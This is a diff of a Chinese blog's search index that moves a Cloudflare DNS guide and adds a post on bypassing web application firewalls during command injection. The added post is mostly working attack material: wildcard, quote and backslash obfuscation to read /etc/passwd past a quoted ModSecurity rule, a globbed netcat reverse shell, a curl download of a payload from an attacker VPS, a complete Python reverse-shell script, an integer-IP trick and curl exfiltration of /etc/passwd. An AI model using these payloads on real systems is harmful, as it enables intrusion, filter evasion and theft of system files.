-<p>games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>使用 \ 符号加回车来绕过WAF</p>
-<p>root@kali:~# c\</p>
-<p>&gt; at &#x2F;e’t’c&#x2F;p”a’s’swd</p>
-<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
-<p>使用curl -d参数读取本地文件</p>
-<p>curl -d @&#x2F;<file> <remote server></p>
-<p>例如</p>
-<p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p>
-<p># 在本地侦听8888端口即可接受到数据</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片"></p>
+<p>视频教程: <a href="https://short.alone-hk.cn/6sugZ">https://short.alone-hk.cn/6sugZ</a></p>
+<p>cloudflare入口: <a href="https://cloudflare.com/">https://cloudflare.com</a></p>
+<p>godaddy入口: <a href="https://www.godaddy.com/">https://www.godaddy.com/</a></p>
+<p>首先注册一个域名添加到cloudflare并修改NS记录为cloudflare</p>
+<p>NS记录在注册商</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-1.png" alt="img">CF NS记录页面</p>
+<p>选用自定义DNS并改成cloudflare的记录</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-3.png" alt="img">NS注册商修改</p>
+<p>接下来配置DNS解析</p>
+<p>添加需要代理的地址选择A记录 名字填写需要代理的地址如www 填写服务器源ip</p>
+<p>将Proxied打开变为黄色代表成功 点击完成</p>
+<p>SSL证书获取</p>
+<p>点击SSL&#x2F;TLS — Origin Server — Create Certificate 创建证书</p>
+<p>如无特殊需要默认即可 默认会创建一个15年的证书 创建完成后要记得保存key 只出现一次(重要)! ! !</p>
+<p>将prm与key部署到服务器即可</p>
+<p>退回到Overview 选择Full (strict)</p>
+<p>到此恭喜你成功了!</p>
 ]]></content>
       <categories>
         <category>安全</category>
       </categories>
       <tags>
-        <tag>web</tag>
+        <tag>cloudflare</tag>
+        <tag>免费cdn</tag>
       </tags>
   </entry>
   <entry>
@@ -1385,35 +1336,84 @@
       </tags>
   </entry>
   <entry>
-    <title>域名注册教学和cloudflare域名解析教程</title>
-    <url>/2023/07/21/%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E6%95%99%E5%AD%A6%E5%92%8Ccloudflare%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>域名注册教学和cloudflare域名解析教程</p>
+    <title>命令注入之Web应用防火墙绕过技巧</title>
+    <url>/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
 <span id="more"></span>
 
-<p>视频教程: <a href="https://short.alone-hk.cn/6sugZ">https://short.alone-hk.cn/6sugZ</a></p>
-<p>cloudflare入口: <a href="https://cloudflare.com/">https://cloudflare.com</a></p>
-<p>godaddy入口: <a href="https://www.godaddy.com/">https://www.godaddy.com/</a></p>
-<p>首先注册一个域名添加到cloudflare并修改NS记录为cloudflare</p>
-<p>NS记录在注册商</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-1.png" alt="img">CF NS记录页面</p>
-<p>选用自定义DNS并改成cloudflare的记录</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2023/01/image-3.png" alt="img">NS注册商修改</p>
-<p>接下来配置DNS解析</p>
-<p>添加需要代理的地址选择A记录 名字填写需要代理的地址如www 填写服务器源ip</p>
-<p>将Proxied打开变为黄色代表成功 点击完成</p>
-<p>SSL证书获取</p>
-<p>点击SSL&#x2F;TLS — Origin Server — Create Certificate 创建证书</p>
-<p>如无特殊需要默认即可 默认会创建一个15年的证书 创建完成后要记得保存key 只出现一次(重要)! ! !</p>
-<p>将prm与key部署到服务器即可</p>
-<p>退回到Overview 选择Full (strict)</p>
-<p>到此恭喜你成功了!</p>
+<p>使用通配符绕过防火墙规则</p>
+<p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p>
+<p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片"></p>
+<p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p>
+<p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p>
+<p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p>
+<p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片"></p>
+<p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p>
+<p>使用字符串拼接绕过防火墙规则</p>
+<p>连接字符串的操作符主要有以下几种</p>
+<p>在python、Java中使用 + 号；在PHP、perl中使用 . 号；在lua语言中则使用 .. 符号来连接字符串。而这些编程语言中的一些字符串连接符，有时候在bash中也可以达到字符连接的效果，这就导致我们可以绕过一些Web应用防火墙规则(例如基于关键词匹配的防火墙规则)。</p>
+<p>root@kali:~# echo Mochazz</p>
+<p>Mochazz</p>
+<p>root@kali:~# echo Mo”’chazz’</p>
+<p>Mochazz</p>
+<p>root@kali:~# echo ‘Mo”chazz’</p>
+<p>Mochazz</p>
+<p>root@kali:~# echo ‘M’och’az’z</p>
+<p>Mochazz</p>
+<p>看一条pm匹配规则（防火墙规则）</p>
+<p># Detect suspicious client by looking at the user agent identification</p>
+<p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p>
+<p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p>
+<p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片"></p>
+<p>使用以下命令在受害机上下载用于反弹shell的脚本</p>
+<p>curl -v “<a href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片"></p>
+<p>shell.py 代码如下</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;python</p>
+<p>import socket,subprocess,os</p>
+<p>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p>
+<p>s.connect((“<my ip address>”,2375))</p>
+<p>os.dup2(s.fileno(),0)</p>
+<p>os.dup2(s.fileno(),1)</p>
+<p>os.dup2(s.fileno(),2)</p>
+<p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p>
+<p>提前在你的VPS上用nc侦听一个端口</p>
+<p>nc -lvp [port]</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片"></p>
+<p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p>
+<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
+<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
+<p>使用 \ 符号来绕过WAF</p>
+<p>root@kali:~# c\a\t &#x2F;etc&#x2F;passwd</p>
+<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
+<p>games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>使用 \ 符号加回车来绕过WAF</p>
+<p>root@kali:~# c\</p>
+<p>&gt; at &#x2F;e’t’c&#x2F;p”a’s’swd</p>
+<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
+<p>使用curl -d参数读取本地文件</p>
+<p>curl -d @&#x2F;<file> <remote server></p>
+<p>例如</p>
+<p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p>
+<p># 在本地侦听8888端口即可接受到数据</p>
+<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片"></p>
 ]]></content>
       <categories>
         <category>安全</category>
       </categories>
       <tags>
-        <tag>cloudflare</tag>
-        <tag>免费cdn</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1757,7 +1757,7 @@ npm install -g cnpm --registry=https://registry.npm.taobao.org &amp;&amp; cnpm i
 <p>出现这个就代表登录成功啦</p>
 <p>You have been successfully authenticated as:</p>
 <p>CLI Login Success</p>
-<p><a href="mailto:&#x78;&#120;&#x78;&#120;&#120;&#64;&#120;&#120;&#120;&#x2e;&#120;&#120;&#120;">&#x78;&#120;&#x78;&#120;&#120;&#64;&#120;&#120;&#120;&#x2e;&#120;&#120;&#120;</a>(您的邮箱）</p>
+<p><a href="mailto:&#120;&#x78;&#x78;&#120;&#x78;&#x40;&#120;&#x78;&#x78;&#x2e;&#120;&#120;&#x78;">&#120;&#x78;&#x78;&#120;&#x78;&#x40;&#120;&#x78;&#x78;&#x2e;&#120;&#120;&#x78;</a>(您的邮箱）</p>
 <p>You can now close this tab and return to the CLI.</p>
 <p>登录成功之后，在电脑的c盘建一个文件夹（名字自定义，其实在哪都可以建，只要你能找到这个文件夹就可以），里面新建一个TXT文件，名称随意，打开输入以下信息</p>
 <pre><code>&#123;&quot;version&quot;: 2,&quot;routes&quot;: [&#123;&quot;src&quot;: &quot;/(.*)&quot;,&quot;dest&quot;: &quot;website/$1&quot;&#125; ]&#125;
